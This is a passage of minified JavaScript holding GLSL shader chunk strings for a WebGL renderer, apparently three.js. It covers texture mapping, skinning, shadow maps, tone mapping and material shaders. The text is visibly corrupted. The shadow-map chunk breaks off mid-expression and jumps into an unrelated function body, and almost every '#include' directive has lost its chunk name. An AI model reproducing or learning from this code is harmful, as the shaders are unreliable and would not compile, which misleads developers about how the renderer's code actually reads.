map;\\n#endif\\n\",map_particle_fragment:\"#ifdef USE_MAP\\n\\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\\n\\tvec4 mapTexel = texture2D( map, uv );\\n\\tdiffuseColor *= mapTexelToLinear( mapTexel );\\n#endif\\n\",map_particle_pars_fragment:\"#ifdef USE_MAP\\n\\tuniform mat3 uvTransform;\\n\\tuniform sampler2D map;\\n#endif\\n\",metalnessmap_fragment:\"float metalnessFactor = metalness;\\n#ifdef USE_METALNESSMAP\\n\\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\\n\\tmetalnessFactor *= texelMetalness.b;\\n#endif\\n\", metalnessmap_pars_fragment:\"#ifdef USE_METALNESSMAP\\n\\tuniform sampler2D metalnessMap;\\n#endif\",morphnormal_vertex:\"#ifdef USE_MORPHNORMALS\\n\\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\\n\\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\\n\\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\\n\\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\\n#endif\\n\",morphtarget_pars_vertex:\"#ifdef USE_MORPHTARGETS\\n\\t#ifndef USE_MORPHNORMALS\\n\\tuniform float morphTargetInfluences[ 8 ];\\n\\t#else\\n\\tuniform float morphTargetInfluences[ 4 ];\\n\\t#endif\\n#endif\", morphtarget_vertex:\"#ifdef USE_MORPHTARGETS\\n\\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\\n\\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\\n\\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\\n\\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\\n\\t#ifndef USE_MORPHNORMALS\\n\\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\\n\\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\\n\\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\\n\\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\\n\\t#endif\\n#endif\\n\", normal_fragment_begin:\"#ifdef FLAT_SHADED\\n\\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\\n\\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\\n\\tvec3 normal = normalize( cross( fdx, fdy ) );\\n#else\\n\\tvec3 normal = normalize( vNormal );\\n\\t#ifdef DOUBLE_SIDED\\n\\t\\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n\\t#endif\\n#endif\\n\",normal_fragment_maps:\"#ifdef USE_NORMALMAP\\n\\t#ifdef OBJECTSPACE_NORMALMAP\\n\\t\\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\t#ifdef FLIP_SIDED\\n\\t\\t\\tnormal = - normal;\\n\\t\\t#endif\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n\\t\\t#endif\\n\\t\\tnormal = normalize( normalMatrix * normal );\\n\\t#else\\n\\t\\tnormal = perturbNormal2Arb( -vViewPosition, normal );\\n\\t#endif\\n#elif defined( USE_BUMPMAP )\\n\\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\\n#endif\\n\", normalmap_pars_fragment:\"#ifdef USE_NORMALMAP\\n\\tuniform sampler2D normalMap;\\n\\tuniform vec2 normalScale;\\n\\t#ifdef OBJECTSPACE_NORMALMAP\\n\\t\\tuniform mat3 normalMatrix;\\n\\t#else\\n\\t\\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm ) {\\n\\t\\t\\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\\n\\t\\t\\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\\n\\t\\t\\tvec2 st0 = dFdx( vUv.st );\\n\\t\\t\\tvec2 st1 = dFdy( vUv.st );\\n\\t\\t\\tfloat scale = sign( st1.t * st0.s - st0.t * st1.s );\\n\\t\\t\\tvec3 S = normalize( ( q0 * st1.t - q1 * st0.t ) * scale );\\n\\t\\t\\tvec3 T = normalize( ( - q0 * st1.s + q1 * st0.s ) * scale );\\n\\t\\t\\tvec3 N = normalize( surf_norm );\\n\\t\\t\\tmat3 tsn = mat3( S, T, N );\\n\\t\\t\\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\\n\\t\\t\\tmapN.xy *= normalScale;\\n\\t\\t\\tmapN.xy *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\\n\\t\\t\\treturn normalize( tsn * mapN );\\n\\t\\t}\\n\\t#endif\\n#endif\\n\", packing:\"vec3 packNormalToRGB( const in vec3 normal ) {\\n\\treturn normalize( normal ) * 0.5 + 0.5;\\n}\\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\\n\\treturn 2.0 * rgb.xyz - 1.0;\\n}\\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );\\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\\nconst float ShiftRight8 = 1. / 256.;\\nvec4 packDepthToRGBA( const in float v ) {\\n\\tvec4 r = vec4( fract( v * PackFactors ), v );\\n\\tr.yzw -= r.xyz * ShiftRight8;\\treturn r * PackUpscale;\\n}\\nfloat unpackRGBAToDepth( const in vec4 v ) {\\n\\treturn dot( v, UnpackFactors );\\n}\\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn ( viewZ + near ) / ( near - far );\\n}\\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\\n\\treturn linearClipZ * ( near - far ) - near;\\n}\\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\\n\\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\\n}\\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\\n\\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\\n}\\n\", premultiplied_alpha_fragment:\"#ifdef PREMULTIPLIED_ALPHA\\n\\tgl_FragColor.rgb *= gl_FragColor.a;\\n#endif\\n\",project_vertex:\"vec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\\ngl_Position = projectionMatrix * mvPosition;\\n\",dithering_fragment:\"#if defined( DITHERING )\\n gl_FragColor.rgb = dithering( gl_FragColor.rgb );\\n#endif\\n\",dithering_pars_fragment:\"#if defined( DITHERING )\\n\\tvec3 dithering( vec3 color ) {\\n\\t\\tfloat grid_position = rand( gl_FragCoord.xy );\\n\\t\\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\\n\\t\\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\\n\\t\\treturn color + dither_shift_RGB;\\n\\t}\\n#endif\\n\", roughnessmap_fragment:\"float roughnessFactor = roughness;\\n#ifdef USE_ROUGHNESSMAP\\n\\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\\n\\troughnessFactor *= texelRoughness.g;\\n#endif\\n\",roughnessmap_pars_fragment:\"#ifdef USE_ROUGHNESSMAP\\n\\tuniform sampler2D roughnessMap;\\n#endif\",shadowmap_pars_fragment:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n\\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\\n\\t\\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\\n\\t}\\n\\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\\n\\t\\tconst vec2 offset = vec2( 0.0, 1.0 );\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / size;\\n\\t\\tvec2 centroidUV = floor( uv * size + 0.5 ) / size;\\n\\t\\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\\n\\t\\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\\n\\t\\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\\n\\t\\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\\n\\t\\tvec2 f = fract( uv * size + 0.5 );\\n\\t\\tfloat a = mix( lb, lt, f.y );\\n\\t\\tfloat b = mix( rb, rt, f.y );\\n\\t\\tfloat c = mix( a, b, f.x );\\n\\t\\treturn c;\\n\\t}\\n\\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\\n\\t\\tfloat shadow = 1.0;\\n\\t\\tshadowCoord.xyz /= shadowCoord.w;\\n\\t\\tshadowCoord.z += shadowBias;\\n\\t\\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x = 0.0, shadowCoord.y 0.0 )\\n\\t\\t\\t\\tplanar.x = 4.0 - v.x;\\n\\t\\t} else if ( absV.x >= almostOne ) {\\n\\t\\t\\tfloat signX = sign( v.x );\\n\\t\\t\\tplanar.x = v.z * signX + 2.0 * signX;\\n\\t\\t} else if ( absV.y >= almostOne ) {\\n\\t\\t\\tfloat signY = sign( v.y );\\n\\t\\t\\tplanar.x = v.x + 2.0 * signY + 2.0;\\n\\t\\t\\tplanar.y = v.z * signY - 2.0;\\n\\t\\t}\\n\\t\\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\\n\\t}\\n\\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\\n\\t\\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\\n\\t\\tvec3 lightToPosition = shadowCoord.xyz;\\n\\t\\tfloat dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );\\t\\tdp += shadowBias;\\n\\t\\tvec3 bd3D = normalize( lightToPosition );\\n\\t\\t#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT )\\n\\t\\t\\tvec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;\\n\\t\\t\\treturn (\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +\\n\\t\\t\\t\\ttexture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )\\n\\t\\t\\t) * ( 1.0 / 9.0 );\\n\\t\\t#else\\n\\t\\t\\treturn texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\", shadowmap_pars_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t\\tuniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHTS ];\\n\\t\\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t\\tuniform mat4 spotShadowMatrix[ NUM_SPOT_LIGHTS ];\\n\\t\\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHTS ];\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t\\tuniform mat4 pointShadowMatrix[ NUM_POINT_LIGHTS ];\\n\\t\\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHTS ];\\n\\t#endif\\n#endif\\n\", shadowmap_vertex:\"#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * worldPosition;\\n\\t}\\n\\t#endif\\n#endif\\n\", shadowmask_pars_fragment:\"float getShadowMask() {\\n\\tfloat shadow = 1.0;\\n\\t#ifdef USE_SHADOWMAP\\n\\t#if NUM_DIR_LIGHTS > 0\\n\\tDirectionalLight directionalLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tdirectionalLight = directionalLights[ i ];\\n\\t\\tshadow *= bool( directionalLight.shadow ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_SPOT_LIGHTS > 0\\n\\tSpotLight spotLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tspotLight = spotLights[ i ];\\n\\t\\tshadow *= bool( spotLight.shadow ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#if NUM_POINT_LIGHTS > 0\\n\\tPointLight pointLight;\\n\\t#pragma unroll_loop\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tpointLight = pointLights[ i ];\\n\\t\\tshadow *= bool( pointLight.shadow ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\\n\\t}\\n\\t#endif\\n\\t#endif\\n\\treturn shadow;\\n}\\n\", skinbase_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\\n\\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\\n\\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\\n\\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\\n#endif\",skinning_pars_vertex:\"#ifdef USE_SKINNING\\n\\tuniform mat4 bindMatrix;\\n\\tuniform mat4 bindMatrixInverse;\\n\\t#ifdef BONE_TEXTURE\\n\\t\\tuniform sampler2D boneTexture;\\n\\t\\tuniform int boneTextureSize;\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tfloat j = i * 4.0;\\n\\t\\t\\tfloat x = mod( j, float( boneTextureSize ) );\\n\\t\\t\\tfloat y = floor( j / float( boneTextureSize ) );\\n\\t\\t\\tfloat dx = 1.0 / float( boneTextureSize );\\n\\t\\t\\tfloat dy = 1.0 / float( boneTextureSize );\\n\\t\\t\\ty = dy * ( y + 0.5 );\\n\\t\\t\\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\\n\\t\\t\\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\\n\\t\\t\\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\\n\\t\\t\\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\\n\\t\\t\\tmat4 bone = mat4( v1, v2, v3, v4 );\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#else\\n\\t\\tuniform mat4 boneMatrices[ MAX_BONES ];\\n\\t\\tmat4 getBoneMatrix( const in float i ) {\\n\\t\\t\\tmat4 bone = boneMatrices[ int(i) ];\\n\\t\\t\\treturn bone;\\n\\t\\t}\\n\\t#endif\\n#endif\\n\", skinning_vertex:\"#ifdef USE_SKINNING\\n\\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\\n\\tvec4 skinned = vec4( 0.0 );\\n\\tskinned += boneMatX * skinVertex * skinWeight.x;\\n\\tskinned += boneMatY * skinVertex * skinWeight.y;\\n\\tskinned += boneMatZ * skinVertex * skinWeight.z;\\n\\tskinned += boneMatW * skinVertex * skinWeight.w;\\n\\ttransformed = ( bindMatrixInverse * skinned ).xyz;\\n#endif\\n\",skinnormal_vertex:\"#ifdef USE_SKINNING\\n\\tmat4 skinMatrix = mat4( 0.0 );\\n\\tskinMatrix += skinWeight.x * boneMatX;\\n\\tskinMatrix += skinWeight.y * boneMatY;\\n\\tskinMatrix += skinWeight.z * boneMatZ;\\n\\tskinMatrix += skinWeight.w * boneMatW;\\n\\tskinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;\\n\\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\\n#endif\\n\", specularmap_fragment:\"float specularStrength;\\n#ifdef USE_SPECULARMAP\\n\\tvec4 texelSpecular = texture2D( specularMap, vUv );\\n\\tspecularStrength = texelSpecular.r;\\n#else\\n\\tspecularStrength = 1.0;\\n#endif\",specularmap_pars_fragment:\"#ifdef USE_SPECULARMAP\\n\\tuniform sampler2D specularMap;\\n#endif\",tonemapping_fragment:\"#if defined( TONE_MAPPING )\\n gl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\\n#endif\\n\",tonemapping_pars_fragment:\"#ifndef saturate\\n\\t#define saturate(a) clamp( a, 0.0, 1.0 )\\n#endif\\nuniform float toneMappingExposure;\\nuniform float toneMappingWhitePoint;\\nvec3 LinearToneMapping( vec3 color ) {\\n\\treturn toneMappingExposure * color;\\n}\\nvec3 ReinhardToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( color / ( vec3( 1.0 ) + color ) );\\n}\\n#define Uncharted2Helper( x ) max( ( ( x * ( 0.15 * x + 0.10 * 0.50 ) + 0.20 * 0.02 ) / ( x * ( 0.15 * x + 0.50 ) + 0.20 * 0.30 ) ) - 0.02 / 0.30, vec3( 0.0 ) )\\nvec3 Uncharted2ToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\treturn saturate( Uncharted2Helper( color ) / Uncharted2Helper( vec3( toneMappingWhitePoint ) ) );\\n}\\nvec3 OptimizedCineonToneMapping( vec3 color ) {\\n\\tcolor *= toneMappingExposure;\\n\\tcolor = max( vec3( 0.0 ), color - 0.004 );\\n\\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\\n}\\n\", uv_pars_fragment:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n#endif\",uv_pars_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvarying vec2 vUv;\\n\\tuniform mat3 uvTransform;\\n#endif\\n\", uv_vertex:\"#if defined( USE_MAP ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( USE_SPECULARMAP ) || defined( USE_ALPHAMAP ) || defined( USE_EMISSIVEMAP ) || defined( USE_ROUGHNESSMAP ) || defined( USE_METALNESSMAP )\\n\\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\\n#endif\",uv2_pars_fragment:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvarying vec2 vUv2;\\n#endif\",uv2_pars_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tattribute vec2 uv2;\\n\\tvarying vec2 vUv2;\\n#endif\", uv2_vertex:\"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\\n\\tvUv2 = uv2;\\n#endif\",worldpos_vertex:\"#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\\n\\tvec4 worldPosition = modelMatrix * vec4( transformed, 1.0 );\\n#endif\\n\",cube_frag:\"uniform samplerCube tCube;\\nuniform float tFlip;\\nuniform float opacity;\\nvarying vec3 vWorldPosition;\\nvoid main() {\\n\\tgl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );\\n\\tgl_FragColor.a *= opacity;\\n}\\n\", cube_vert:\"varying vec3 vWorldPosition;\\n#include \\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include \\n\\t#include \\n\\tgl_Position.z = gl_Position.w;\\n}\\n\",depth_frag:\"#if DEPTH_PACKING == 3200\\n\\tuniform float opacity;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tdiffuseColor.a = opacity;\\n\\t#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#if DEPTH_PACKING == 3200\\n\\t\\tgl_FragColor = vec4( vec3( 1.0 - gl_FragCoord.z ), opacity );\\n\\t#elif DEPTH_PACKING == 3201\\n\\t\\tgl_FragColor = packDepthToRGBA( gl_FragCoord.z );\\n\\t#endif\\n}\\n\", depth_vert:\"#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#ifdef USE_DISPLACEMENTMAP\\n\\t\\t#include \\n\\t\\t#include \\n\\t\\t#include \\n\\t#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", distanceRGBA_frag:\"#define DISTANCE\\nuniform vec3 referencePosition;\\nuniform float nearDistance;\\nuniform float farDistance;\\nvarying vec3 vWorldPosition;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main () {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( 1.0 );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\tfloat dist = length( vWorldPosition - referencePosition );\\n\\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\\n\\tdist = saturate( dist );\\n\\tgl_FragColor = packDepthToRGBA( dist );\\n}\\n\", distanceRGBA_vert:\"#define DISTANCE\\nvarying vec3 vWorldPosition;\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#ifdef USE_DISPLACEMENTMAP\\n\\t\\t#include \\n\\t\\t#include \\n\\t\\t#include \\n\\t#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tvWorldPosition = worldPosition.xyz;\\n}\\n\", equirect_frag:\"uniform sampler2D tEquirect;\\nvarying vec3 vWorldPosition;\\n#include \\nvoid main() {\\n\\tvec3 direction = normalize( vWorldPosition );\\n\\tvec2 sampleUV;\\n\\tsampleUV.y = asin( clamp( direction.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\\n\\tsampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;\\n\\tgl_FragColor = texture2D( tEquirect, sampleUV );\\n}\\n\",equirect_vert:\"varying vec3 vWorldPosition;\\n#include \\nvoid main() {\\n\\tvWorldPosition = transformDirection( position, modelMatrix );\\n\\t#include \\n\\t#include \\n}\\n\", linedashed_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\nuniform float dashSize;\\nuniform float totalSize;\\nvarying float vLineDistance;\\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\\n\\t\\tdiscard;\\n\\t}\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include \\n\\t#include \\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", linedashed_vert:\"uniform float scale;\\nattribute float lineDistance;\\nvarying float vLineDistance;\\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvLineDistance = scale * lineDistance;\\n\\tvec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );\\n\\tgl_Position = projectionMatrix * mvPosition;\\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshbasic_frag:\"uniform vec3 diffuse;\\nuniform float opacity;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\t#ifdef USE_LIGHTMAP\\n\\t\\treflectedLight.indirectDiffuse += texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n\\t#else\\n\\t\\treflectedLight.indirectDiffuse += vec3( 1.0 );\\n\\t#endif\\n\\t#include \\n\\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\\n\\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\\n\\t#include \\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshbasic_vert:\"#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#ifdef USE_ENVMAP\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#endif\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n}\\n\", meshlambert_frag:\"uniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float opacity;\\nvarying vec3 vLightFront;\\n#ifdef DOUBLE_SIDED\\n\\tvarying vec3 vLightBack;\\n#endif\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\nvoid main() {\\n\\t#include \\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\t#include \\n\\treflectedLight.indirectDiffuse = getAmbientLightIrradiance( ambientLightColor );\\n\\t#include \\n\\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\\n\\t#ifdef 